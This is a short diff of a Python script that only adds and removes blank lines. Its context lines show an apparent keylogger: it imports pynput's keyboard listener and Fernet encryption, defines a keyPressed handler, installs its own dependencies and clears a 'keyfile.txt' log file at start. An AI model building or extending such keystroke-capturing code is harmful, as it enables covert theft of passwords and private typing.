@@ -25,10 +25,8 @@ def ensure_libraries_installed():
         install_package('cryptography')
 
 
-
 from pynput import keyboard
 from cryptography.fernet import Fernet
-
 
 def get_encryption_key():
     try:
@@ -70,6 +68,7 @@ def keyPressed(key):
 if __name__ == "__main__":
     install_python()
     ensure_libraries_installed()
+
     # Ensure the keyfile.txt is empty at the start
     open("keyfile.txt", 'wb').close()  # Open in binary mode to create an empty file
 
